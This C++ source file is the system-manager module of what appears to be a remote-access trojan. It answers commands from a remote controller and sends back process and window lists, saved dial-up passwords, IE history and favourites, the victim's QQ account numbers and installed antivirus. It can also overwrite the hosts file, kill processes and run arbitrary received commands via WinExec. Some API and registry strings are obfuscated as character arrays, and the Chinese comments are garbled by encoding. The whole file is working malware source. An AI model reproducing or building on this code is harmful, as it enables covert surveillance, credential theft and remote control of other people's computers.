// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "SystemManager.h"
#include "Dialupass.h"
#include "SysInfo.h"
#include <WtsApi32.h>

////////////////////////
#include <tlhelp32.h>
#include <psapi.h>
#pragma comment(lib,"Psapi.lib")
#include "until.h"
#include "GetNetState.h"

extern char* GetVirus();
BOOL GetOSVerIs64Bit() //��ȡϵͳƽ̨
{
	BOOL bRet = FALSE;
	SYSTEM_INFO si;
	typedef VOID(__stdcall* GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
	GETNATIVESYSTEMINFO fnGetNativeSystemInfo;
	char yGyioJf[] = { 'G','e','t','N','a','t','i','v','e','S','y','s','t','e','m','I','n','f','o','\0' };
	fnGetNativeSystemInfo = (GETNATIVESYSTEMINFO)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), yGyioJf);
	if (fnGetNativeSystemInfo != NULL)
	{
		fnGetNativeSystemInfo(&si);
		if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
		{
			bRet = TRUE;
		}
	}
	return bRet;
}
extern FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName);
extern BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);

//////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_MEMOEY = 1,     //��ȡCPU�ڴ�ֵ����
	COMMAND_STOPED,       //����ֹͣ����
	TOKEN_MEMORY          //����˷��͹����ڴ�ʹ��ֵ
};

#define SystemBasicInformation       0
#define SystemPerformanceInformation 2
#define SystemTimeOfDayInformation   3
#define Li2Double(x) ((double)((x).HighPart) * 4.294967296E9 + (double)((x).LowPart))

typedef struct
{
	DWORD   dwUnknown1;
	ULONG   uKeMaximumIncrement;
	ULONG   uPageSize;
	ULONG   uMmNumberOfPhysicalPages;
	ULONG   uMmLowestPhysicalPage;
	ULONG   uMmHighestPhysicalPage;
	ULONG   uAllocationGranularity;
	PVOID   pLowestUserAddress;
	PVOID   pMmHighestUserAddress;
	ULONG   uKeActiveProcessors;
	BYTE    bKeNumberProcessors;
	BYTE    bUnknown2;
	WORD    wUnknown3;
} SYSTEM_BASIC_INFORMATION;

typedef struct
{
	LARGE_INTEGER   liIdleTime;
	DWORD           dwSpare[512];
} SYSTEM_PERFORMANCE_INFORMATION;

typedef struct
{
	LARGE_INTEGER liKeBootTime;
	LARGE_INTEGER liKeSystemTime;
	LARGE_INTEGER liEXPTimeZoneBias;
	ULONG         uCurrentTimeZoneId;
	DWORD         dwReserved;
} SYSTEM_TIME_INFORMATION;

typedef LONG(WINAPI* PROCNTQSI)(UINT, PVOID, ULONG, PULONG);

////////////////////////////////////////////////////////////////////////////////////////////
CSystemManager::CSystemManager(CClientSocket* pClient, UINT Ports, UCHAR Linetypes, UCHAR Opertypes, CHAR* Addressl) : CManager(pClient)
{
	NetPort = Ports;        //���Ӷ˿�
	NetLine = Linetypes;    //���ӷ�ʽ
	NetOpert = Opertypes;   //��������
	Linkaddress = Addressl; //���ӵ�ַ
	hSendMemoryThread = NULL;
	BYTE	bToken = TOKEN_CSystemManager;
	Send((LPBYTE)&bToken, 1);

	WaitForDialogOpen();    //�ȴ��Ի����
	//	hStopEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
	getSendSystemInfo();
	hSendMemoryThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendCPUAndMemoryThread, (LPVOID)this, 0, NULL);
}

CSystemManager::~CSystemManager()
{
	TerminateThread(hSendMemoryThread, 0);
	CloseHandle(hSendMemoryThread);
	//	CloseHandle(hStopEvent);
}

void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();
	switch (lpBuffer[0])
	{
	case COMMAND_SYSTEMINFO:     //����ϵͳ��Ϣ
		getSendSystemInfo();
		break;
	case COMMAND_PSLIST:         //���ͽ����б�
		SendProcessList();
		break;
	case COMMAND_WSLIST:         //���ʹ����б�
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:      //���Ͳ�������
		SendDialupassList();
		break;
	case COMMAND_KILLPROCESS:    //�رս���
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_WINDOW_CLOSE:   //�򴰿ڷ��͹ر���Ϣ
		CloseWindow(lpBuffer + 1);
		break;
	case COMMAND_WINDOW_TEST:    //���ش���|��ʾ����|��С��|���
		TestWindow(lpBuffer + 1);
		break;
		// 	case COMMAND_MEMOEY:         //��ȡCPU�ڴ�ʹ�����
		// 		hSendMemoryThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendCPUAndMemoryThread, (LPVOID)this, 0, NULL);
		// 		break;
		// 	case COMMAND_STOPED:
		// 		SetEvent(hStopEvent);
		// 		break;
	case COMMAND_SOFTWARELIST:   //���������Ϣ�б�
		SendSoftWareList();
		break;
	case COMMAND_IHLIST:         //����IE�����¼
		SendIEHistoryList();
		break;
	case COMMAND_FULIST:         //����IE�ղؼ�
		SendFavoritesUrlList();
		break;
	case COMMAND_NSLIST:         //��������������Ϣ�б�
		SendNetStateList();
		break;
	case COMMAND_GETHOSTS:       //����Hosts�ļ�����
		SendHostsFileInfo();
		break;
	case COMMAND_SETHOSTS:       //�޸�Hosts�ļ�����
		SaveHostsFileInfo(lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_APPUNINSTALL:   //ж�ر������
		//printf("%s",(char*)lpBuffer +1);
		WinExec((LPCSTR)lpBuffer + 1, SW_SHOW);
		break;
	case COMMAND_NETCONFIG:
		SendNetconfigList();
		break;
	case COMMAND_HARDWARE:				// Ӳ����Ϣ
		SendHardwareList();
		break;
	case COMMAND_STARTUP:				// ������
		SendStartupList();
		break;
	case COMMAND_NEXT:
	{
		if (1 == nSize)
			NotifyDialogIsOpen();
		break;
	}
	default:
		break;
	}
}

void CSystemManager::SendProcessList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendWindowsList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendDialupassList()
{
	CDialupass	pass;

	int	nPacketLen = 0;
	int i;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo* pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}

	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);

	DWORD	dwOffset = 1;

	for (i = 0; i < pass.GetMax(); i++)
	{

		COneInfo* pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}

	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendHostsFileInfo()
{
	char szHostsFile[MAX_PATH] = { 0 };
	BOOL bIsWow64 = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwSize = 0, dwRead;
	LPBYTE lpBuffer = NULL;

	GetWindowsDirectory(szHostsFile, sizeof(szHostsFile));
	::IsWow64Process(::GetCurrentProcess(), &bIsWow64);
	if (bIsWow64)
		strcat(szHostsFile, "\\sysnative\\drivers\\etc\\hosts");
	else
		strcat(szHostsFile, "\\system32\\drivers\\etc\\hosts");

	SetFileAttributes(szHostsFile, FILE_ATTRIBUTE_NORMAL);
	hFile = CreateFile(szHostsFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;
	dwSize = GetFileSize(hFile, NULL);
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwSize + 2);
	if (!ReadFile(hFile, lpBuffer + 1, dwSize, &dwRead, NULL))
	{
		LocalFree(lpBuffer);
		CloseHandle(hFile);
		return;
	}
	CloseHandle(hFile);

	lpBuffer[0] = TOKEN_HOSTSINFO;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SaveHostsFileInfo(LPBYTE lpBuffer, UINT nSize)
{
	char szHostsFile[MAX_PATH] = { 0 };
	BOOL bIsWow64 = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwWritten;

	GetWindowsDirectory(szHostsFile, sizeof(szHostsFile));
	::IsWow64Process(::GetCurrentProcess(), &bIsWow64);
	if (bIsWow64)
		strcat(szHostsFile, "\\sysnative\\drivers\\etc\\hosts");
	else
		strcat(szHostsFile, "\\system32\\drivers\\etc\\hosts");

	SetFileAttributes(szHostsFile, FILE_ATTRIBUTE_NORMAL);
	hFile = CreateFile(szHostsFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;
	if (!WriteFile(hFile, lpBuffer, nSize, &dwWritten, NULL))
	{
		CloseHandle(hFile);
		return;
	}
	CloseHandle(hFile);
}

void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)  //�رճ���
{
	HANDLE hProcess = NULL;

	for (unsigned int i = 0; i < nSize; i += 4)
	{
		DWORD Ipsid = *(LPDWORD)(lpBuffer + i);
		hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, Ipsid);
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}

	//����Sleep�£���ֹ����
	Sleep(200);
	//ˢ�½����б�
	SendProcessList();
	//ˢ�����������б�
	SendNetStateList();
	//ˢ�´����б�
//	SendWindowsList();	
}

LPBYTE CSystemManager::getProcessList()
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE			hProcessSnap = NULL;
	HANDLE			hProcess = NULL;
	PROCESSENTRY32	pe32 = { 0 };
	char			szProcPriority[64] = { 0 };
	char			szThreadsCount[32] = { 0 };
	char			szProcUserName[64] = { 0 };
	char			szProcMemUsed[128] = { 0 };
	char			szProcFileName[MAX_PATH] = { 0 };
	char           dwFileSize[32] = {0}; //�ļ���С
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	int NUMdwFileSize = 0;
	// ��ȡϵͳ���̿���
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024); //��ʱ����һ�»�����
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;

	// ������������Ϣ������
	for (BOOL bPE32 = Process32First(hProcessSnap, &pe32); bPE32; bPE32 = Process32Next(hProcessSnap, &pe32))
	{
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);

		// ��ȡ�������ȼ�
		ZeroMemory(szProcPriority, sizeof(szProcPriority));
		switch (GetPriorityClass(hProcess))
		{
		case REALTIME_PRIORITY_CLASS:
			strcpy(szProcPriority, "ʵʱ");
			break;
		case HIGH_PRIORITY_CLASS:
			strcpy(szProcPriority, "��");
			break;
		case ABOVE_NORMAL_PRIORITY_CLASS:
			strcpy(szProcPriority, "���ڱ�׼");
			break;
		case NORMAL_PRIORITY_CLASS:
			strcpy(szProcPriority, "��׼");
			break;
		case BELOW_NORMAL_PRIORITY_CLASS:
			strcpy(szProcPriority, "���ڱ�׼");
			break;
		case IDLE_PRIORITY_CLASS:
			strcpy(szProcPriority, "��");
			break;
		}

		// ��ȡ�����߳���
		sprintf(szThreadsCount, "%5u", pe32.cntThreads);

		// ��ȡ�����û���
		HANDLE hProcToken = NULL; SID_NAME_USE snu;
		if (OpenProcessToken(hProcess, TOKEN_QUERY, &hProcToken))
		{
			DWORD dwReturnLength, dwUserSize = sizeof(szProcUserName);
			char szDomainName[128] = { 0 }; DWORD dwDomainName = sizeof(szDomainName);

			GetTokenInformation(hProcToken, TokenUser, NULL, 0, &dwReturnLength);
			PTOKEN_USER	pTokenUser = (PTOKEN_USER)malloc(dwReturnLength);
			GetTokenInformation(hProcToken, TokenUser, pTokenUser, dwReturnLength, &dwReturnLength);
			LookupAccountSid(NULL, pTokenUser->User.Sid, szProcUserName, &dwUserSize, szDomainName, &dwDomainName, &snu);
			free(pTokenUser);
			CloseHandle(hProcToken);
		}
		else ZeroMemory(szProcUserName, sizeof(szProcUserName));

		// ��ȡ����ռ���ڴ�
		PROCESS_MEMORY_COUNTERS pmc = { 0 };
		if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc)))
		{
			sprintf(szProcMemUsed, "%7u K", pmc.WorkingSetSize / 1024);
		}
		else ZeroMemory(szProcMemUsed, sizeof(szProcMemUsed));

		// �õ��������������
		if (GetModuleFileNameEx(hProcess, NULL, szProcFileName, sizeof(szProcFileName)))
		{
			char szWinDir[MAX_PATH] = { 0 }, szBuffer[MAX_PATH] = { 0 };
			GetWindowsDirectory(szWinDir, sizeof(szWinDir));
			if (strnicmp(szProcFileName, "\\SystemRoot", 11) == 0)
			{
				strcpy(szBuffer, szWinDir);
				strcat(szBuffer, szProcFileName + 11);
				strcpy(szProcFileName, szBuffer);

			}
			else if (strnicmp(szProcFileName, "\\??\\", 4) == 0)
			{
				strcpy(szBuffer, szProcFileName + 4);
				strcpy(szProcFileName, szBuffer);
			}
			else if (strnicmp(szProcFileName, "\\\\?\\", 4) == 0)
			{
				strcpy(szBuffer, szProcFileName + 4);
				strcpy(szProcFileName, szBuffer);
			}

			HANDLE handle = CreateFile(szProcFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
			if (handle != INVALID_HANDLE_VALUE)
			{
				NUMdwFileSize = GetFileSize(handle, NULL) / 1024;
				sprintf(dwFileSize, "%d", NUMdwFileSize);
				CloseHandle(handle);
			}
			else
			{
				NUMdwFileSize = 0;
				sprintf(dwFileSize, "%d", NUMdwFileSize);
			}
		}
		else strcpy(szProcFileName, "?");

		dwLength = sizeof(DWORD) +
			lstrlen(pe32.szExeFile) + 1 +
			lstrlen(szProcPriority) + 1 +
			lstrlen(szThreadsCount) + 1 +
			lstrlen(szProcUserName) + 1 +
			lstrlen(szProcMemUsed) + 1 +
			lstrlen(dwFileSize) + 1 +
			lstrlen(szProcFileName) + 1;

		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);
	
	
			
		// ���ݽṹ: ����ID+������+���ȼ�+�߳���+ռ���ڴ�+�ļ���С+����������
		memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));        // ����ID
		dwOffset += sizeof(DWORD);

		memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1); // ������
		dwOffset += lstrlen(pe32.szExeFile) + 1;

		memcpy(lpBuffer + dwOffset, szProcPriority, lstrlen(szProcPriority) + 1); // ���ȼ�
		dwOffset += lstrlen(szProcPriority) + 1;

		memcpy(lpBuffer + dwOffset, szThreadsCount, lstrlen(szThreadsCount) + 1); // �߳���
		dwOffset += lstrlen(szThreadsCount) + 1;

		memcpy(lpBuffer + dwOffset, szProcUserName, lstrlen(szProcUserName) + 1); // �û���
		dwOffset += lstrlen(szProcUserName) + 1;

		memcpy(lpBuffer + dwOffset, szProcMemUsed, lstrlen(szProcMemUsed) + 1);   // ռ���ڴ�
		dwOffset += lstrlen(szProcMemUsed) + 1;

		memcpy(lpBuffer + dwOffset, &dwFileSize, lstrlen(dwFileSize) + 1);   // �ļ���С
		dwOffset += lstrlen(dwFileSize) + 1;

		memcpy(lpBuffer + dwOffset, szProcFileName, lstrlen(szProcFileName) + 1); // ����������
		dwOffset += lstrlen(szProcFileName) + 1;

		CloseHandle(hProcess);
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	CloseHandle(hProcessSnap);

	EnablePrivilege(SE_DEBUG_NAME, FALSE);
	return lpBuffer;
}

bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE*)lParam;
	char	strTitle[1024];

	try
	{
		GetWindowText(hwnd, strTitle, sizeof(strTitle) - 1);
		strTitle[sizeof(strTitle) - 1] = 0;
		if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
			return true;
		if (lpBuffer == NULL)
		{
			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
			dwOffset = 1;
		}
		else
		{
			dwOffset = LocalSize(lpBuffer);
			while (*(lpBuffer + dwOffset - 2) == 0) dwOffset--;
		}
		dwLength = sizeof(DWORD) + sizeof(HWND) + lstrlen(strTitle) + 1;
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
	}
	catch (...)
	{
		return true;
	}

	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), &hwnd, sizeof(HWND));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD) + sizeof(HWND), strTitle, lstrlen(strTitle) + 1);

	*(LPBYTE*)lParam = lpBuffer;
	return true;
}

LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;
}

//��ȡ�ڴ�ʹ�����
void SendCPUAndMemoryInfo(DWORD d, LPVOID lparam)
{
	CSystemManager* pThis = (CSystemManager*)lparam;

	char buf[12];
	ZeroMemory(buf, 12);
	buf[0] = TOKEN_MEMORY;
	MEMORYSTATUS mem;
	::GlobalMemoryStatus(&mem);
	memcpy(buf + 1, (void*)&mem.dwMemoryLoad, sizeof(DWORD));   //�ڴ�

	memcpy(buf + 1 + sizeof(DWORD), (void*)&d, sizeof(DWORD));

	pThis->Send((unsigned char*)buf, 12);
}

DWORD WINAPI CSystemManager::SendCPUAndMemoryThread(LPVOID lparam)
{
	CSystemManager* pThis = (CSystemManager*)lparam;
	SYSTEM_PERFORMANCE_INFORMATION SysPerfInfo;
	SYSTEM_TIME_INFORMATION        SysTimeInfo;
	SYSTEM_BASIC_INFORMATION       SysBaseInfo;
	double                         dbIdleTime;
	double                         dbSystemTime;
	LONG                           status;
	LARGE_INTEGER                  liOldIdleTime = { 0,0 };
	LARGE_INTEGER                  liOldSystemTime = { 0,0 };

	PROCNTQSI pNtQuerySystemInformation = (PROCNTQSI)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation");
	if (!pNtQuerySystemInformation)
		return 0;
	// get number of processors in the system
	status = pNtQuerySystemInformation(SystemBasicInformation, &SysBaseInfo, sizeof(SysBaseInfo), NULL);
	if (status != NO_ERROR)
		return 0;
	//printf("CPU Usage (press any key to exit): ");
	BYTE count = 0;
	while (1)
	{
		//����µ�ϵͳʱ��
		status = pNtQuerySystemInformation(SystemTimeOfDayInformation, &SysTimeInfo, sizeof(SysTimeInfo), 0);
		if (status != NO_ERROR)
			return 0;
		// ����µ�CPU����ʱ��
		status = pNtQuerySystemInformation(SystemPerformanceInformation, &SysPerfInfo, sizeof(SysPerfInfo), NULL);
		if (status != NO_ERROR)
			return 0;
		// ������ǵ�һ������ - ������
		if (liOldIdleTime.QuadPart != 0)
		{
			// ��ǰֵ=��ֵ - ��ֵ
			dbIdleTime = Li2Double(SysPerfInfo.liIdleTime) - Li2Double(liOldIdleTime);
			dbSystemTime = Li2Double(SysTimeInfo.liKeSystemTime) - Li2Double(liOldSystemTime);

			// ��ǰCPU����=����ʱ��/ϵͳʱ��
			dbIdleTime = dbIdleTime / dbSystemTime;
			// ��ǰCPUʹ���ʣ�= 100  - ����ǰCPU����* 100��/����������
			dbIdleTime = 100.0 - dbIdleTime * 100.0 / (double)SysBaseInfo.bKeNumberProcessors + 0.5;
			SendCPUAndMemoryInfo((unsigned long)dbIdleTime, lparam);
		}

		// store new CPU's idle and system time
		liOldIdleTime = SysPerfInfo.liIdleTime;
		liOldSystemTime = SysTimeInfo.liKeSystemTime;
		// 		if (WaitForSingleObject(pThis->hStopEvent,1000)==WAIT_OBJECT_0)
		// 		{
		// 			CloseHandle(pThis->hSendMemoryThread);
		// 			pThis->hSendMemoryThread = NULL;
		// 			break;
		// 		}
		Sleep(1000);
	}

	return true;
}

BOOL GetTokenByName(HANDLE& hToken, LPSTR lpName)
{
	if (!lpName)
	{
		return FALSE;
	}
	HANDLE         hProcessSnap = NULL;
	BOOL           bRet = FALSE;
	PROCESSENTRY32 pe32 = { 0 };

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return (FALSE);

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			_strupr(pe32.szExeFile);
			if (!strcmp(pe32.szExeFile, lpName))
			{
				HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
				bRet = OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
				CloseHandle(hProcessSnap);
				return (bRet);
			}
		} while (Process32Next(hProcessSnap, &pe32));
		bRet = TRUE;
	}
	else
		bRet = FALSE;

	CloseHandle(hProcessSnap);
	return (bRet);
}

BOOL GetCurrentUserName(char* szUserName)
{
	LPSTR lpUserName = NULL;
	DWORD dwUserSize = 0;

	if (WTSQuerySessionInformation(NULL, WTS_CURRENT_SESSION, WTSUserName, &lpUserName, &dwUserSize))
	{
		strcpy(szUserName, lpUserName);
		WTSFreeMemory(lpUserName);
		if (!strlen(szUserName))
		{
			strcpy(szUserName, "���û���½״̬!");
			return FALSE;
		}
		return TRUE;
	}
	strcpy(szUserName, "���û���½״̬!");
	return FALSE;
}

void CSystemManager::NetSystem(UINT Port)
{
	NetPort = Port;     //���Ӷ˿�
}

char* CSystemManager::DelSpace(char* szData)
{
	int i = 0;
	while (1)
	{
		if (strnicmp(szData + i, " ", 1))
			break;
		i++;
	}
	int j = i;
	while (*(szData + j) != '\0')
	{
		if (!strnicmp(szData + j, "  ", 2))
			memmove(szData + j, szData + j + 1, strlen(szData + j + 1) + 1);
		else
			j++;
	}
	return (szData + i);
}

void CSystemManager::getSendSystemInfo()
{
	MESSAGEInfo Infomsg;
	ZeroMemory(&Infomsg, sizeof(Infomsg));
	//��ȡ����ϵͳ�����Ϣ
	Infomsg.bToken = TOKEN_SYSTEMINFO;

	//////////////CPU Speed////////////////////////////////
	DWORD dwCpu, dwBufLen;
	HKEY hKey;
	char SubKey1[] = { 'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0' };
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, SubKey1, 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
	{
		dwBufLen = sizeof(DWORD);
		RegQueryValueEx(hKey, ("~MHz"), NULL, NULL, (LPBYTE)&dwCpu, &dwBufLen);
		RegCloseKey(hKey);
		SYSTEM_INFO SysInfo; //���ڻ�ȡCPU������
		GetSystemInfo(&SysInfo);
		wsprintf(Infomsg.szCpuSpeend, "%d*%dMHz", SysInfo.dwNumberOfProcessors, dwCpu);
	}
	else
		strcpy(Infomsg.szCpuInfo, "CPU�ٶ��޷���ȡ!");

	//Get CPU Info=========================================
	char SubKey2[] = { 'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0','\0' };
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, SubKey2, 0L, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
	{
		DWORD dwType;
		DWORD dwSize = 128 * sizeof(TCHAR);
		char  ValueSz[MAX_PATH] = { 0 };
		if (RegQueryValueEx(hKey, ("ProcessorNameString"), NULL, &dwType, (BYTE*)ValueSz, &dwSize) == ERROR_SUCCESS)
			strcpy(Infomsg.szCpuInfo, DelSpace(ValueSz));
		RegCloseKey(hKey);
	}
	else
		strcpy(Infomsg.szCpuInfo, "CPU��Ϣ�޷���ȡ!");

	//��ȡ��������ƺ͵�ǰ��¼�û���
	DWORD dwLen = sizeof(Infomsg.szPcName);
	GetComputerName(Infomsg.szPcName, &dwLen);
	GetCurrentUserName(Infomsg.szUserName);

	//��ȡ�ʱ��
	DWORD dwTime, dwDay, dwHour, dwMin;
	dwTime = GetTickCount();
	dwDay = dwTime / (1000 * 60 * 60 * 24);
	dwTime = dwTime % (1000 * 60 * 60 * 24);
	dwHour = dwTime / (1000 * 60 * 60);
	dwTime = dwTime % (1000 * 60 * 60);
	dwMin = dwTime / (1000 * 60);
	wsprintf(Infomsg.szActiveTime, "%d��%dʱ%d��", dwDay, dwHour, dwMin);

	//Get Screen Size=================================
	HDC hDeskTopDC = GetDC(NULL);
	wsprintf(Infomsg.szScrSize, ("%d * %d"), GetDeviceCaps(hDeskTopDC, DESKTOPHORZRES), GetDeviceCaps(hDeskTopDC, DESKTOPVERTRES));
	ReleaseDC(NULL, hDeskTopDC);

	if (NetLine == 0)
		wsprintf(Infomsg.LineName, "����IP(1)���ߣ�%s", Linkaddress);  //��������д��
	if (NetLine == 1)
		wsprintf(Infomsg.LineName, "QQ����(2)���ߣ�%s", Linkaddress);  //��������д��

	wsprintf(Infomsg.LinePort, "%d", NetPort);         //���߶˿�д��
	wsprintf(Infomsg.Program, "%s", GetCommandLine()); //��ȡ(������)

	char szUserName[UNLEN + 1];
	DWORD dwUserLen = UNLEN;
	GetUserName(szUserName, &dwUserLen);
	if (NetOpert == 0)       // ��ɫ����һ��
		wsprintf(Infomsg.InstallOpen, "%s%s%s", "(��ɫ����ģʽ)--", szUserName, "����������!");   //�������з�ʽ
	else if (NetOpert == 1)  // ������������
		wsprintf(Infomsg.InstallOpen, "%s%s%s", "(��������ģʽ)--", szUserName, "�û�����!");     //�������з�ʽ
	else if (NetOpert == 2)  // ֱ����������
		wsprintf(Infomsg.InstallOpen, "%s%s%s", "(Run����ģʽ)--", szUserName, "�û�����!");      //�������з�ʽ
	else if (NetOpert == 3)  // Run ��������
		wsprintf(Infomsg.InstallOpen, "%s%s%s", "(ע�������ģʽ)--", szUserName, "�û�����!");   //�������з�ʽ

	wsprintf(Infomsg.szUserVirus, "%s", GetVirus());   //ɱ�����

	//��ȡ��ǰ���е�QQ����
	char szText[MAX_PATH] = "CTXOPConntion_Class";
	char szQQNumber[MAX_PATH] = { 0 };
	HWND hWnd = FindWindow(szText, NULL);
	while (hWnd)
	{
		if (strcmp(szText, "CTXOPConntion_Class") == 0)
		{
			GetWindowText(hWnd, szText, MAX_PATH);
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len + 1]);
			if (strlen(Infomsg.szQQNum) + strlen(szQQNumber) + 2 <= sizeof(Infomsg.szQQNum))
			{
				strcat(Infomsg.szQQNum, szQQNumber);
				strcat(Infomsg.szQQNum, " ");
			}
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
		GetClassName(hWnd, szText, MAX_PATH);
	}

	//�ڴ��С
	MEMORYSTATUSEX	MemInfo; //��GlobalMemoryStatusEx����ʾ2G�����ڴ�
	MemInfo.dwLength = sizeof(MemInfo);
	GlobalMemoryStatusEx(&MemInfo);
	Infomsg.Memory = MemInfo.ullTotalPhys / 1024 / 1024;

	Send((LPBYTE)&Infomsg, sizeof(MESSAGEInfo));
}

void CSystemManager::CloseWindow(LPBYTE buf)
{
	DWORD hwnd;
	memcpy(&hwnd, buf, sizeof(DWORD));            //�õ����ھ�� 
	::PostMessage((HWND__*)hwnd, WM_CLOSE, 0, 0); //�򴰿ڷ��͹ر���Ϣ

	Sleep(200);
	SendWindowsList();  //������ʾˢ��
}

void CSystemManager::TestWindow(LPBYTE buf)
{
	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd, buf, sizeof(DWORD));        //�õ����ھ��
	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD)); //�õ����ڴ������
	ShowWindow((HWND__*)hwnd, dHow);
}

void CSystemManager::SendNetStateList()
{
	LPBYTE	lpBuffer = getNetStateList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendFavoritesUrlList()
{
	LPBYTE	lpBuffer = getFavoritesUrlList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

